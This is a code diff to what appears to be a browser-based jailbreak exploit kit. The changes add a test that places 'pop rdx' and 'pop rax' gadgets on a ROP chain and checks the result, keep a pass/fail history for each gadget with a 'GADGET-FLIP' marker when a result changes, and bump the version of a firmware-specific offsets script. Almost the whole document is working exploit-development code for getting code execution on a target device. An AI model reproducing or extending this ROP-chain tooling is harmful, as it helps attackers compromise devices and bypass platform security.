@@ -1287,12 +1287,44 @@ async function prepare(p) {
             await chain.run();
             const got = p.read8(out);
             const okv = check(got);
+            const prior = ps.gt[name];
             ps.gt[name] = okv ? "ok" : ("0x" + got.toString());
+            /* syscall:getgid passed in one run and crashed the chain in
+               another, so results here are not always reproducible. Keep a
+               tally: a verdict backed by one observation is worth less than one
+               backed by several, and a flip is worth knowing about. */
+            ps.gtHist = ps.gtHist || {};
+            const h = ps.gtHist[name] = ps.gtHist[name] || { ok: 0, bad: 0 };
+            if (okv) h.ok++; else h.bad++;
+            if (prior && prior !== ps.gt[name])
+                jbmark("GADGET-FLIP", name + ": was " + prior + ", now "
+                    + ps.gt[name] + " (ok=" + h.ok + " bad=" + h.bad + ")");
             gtSave();
             if (!okv) bad.push(name + "=0x" + got.toString());
         };
 
         try {
+            /* pop rdx FIRST. Every test costs a reload when it crashes, so the
+               open question goes at the front rather than queued behind ones
+               whose answers we already have. This decides whether the region
+               above ~1.2MB is live code at all, which determines whether the
+               other bad gadgets are recoverable by correcting addresses or not
+               recoverable at all -- worth more than any single gadget. */
+            {
+                const V0 = new int64(0x41414141, 0x00004141);
+                const M0 = new int64(0x5A5A5A5A, 0x00005A5A);
+                await runTest("exec:pop rdx", () => {
+                    chain.push(gadgets["pop rdx"]); chain.push(V0);
+                    chain.push(gadgets["pop rax"]); chain.push(M0);
+                }, (v) => v.low === M0.low && v.hi === M0.hi);
+                jbmark("POP-RDX", "0x" + wk_gadgetmap["pop rdx"].toString(16)
+                    + " => " + (ps.gt["exec:pop rdx"] || "?")
+                    + (ps.gt["exec:pop rdx"] === "ok"
+                        ? " -- that region IS live code, so the bad gadgets are"
+                        + " mislocated rather than pointing into data"
+                        : ""));
+            }
+
             /* Syscalls first, because they are the most informative test left
                and each crash costs a whole reload.
                write_result -- `mov [rdi], rax` -- is already trusted: every
@@ -1462,4 +1494,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=38`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=39`);
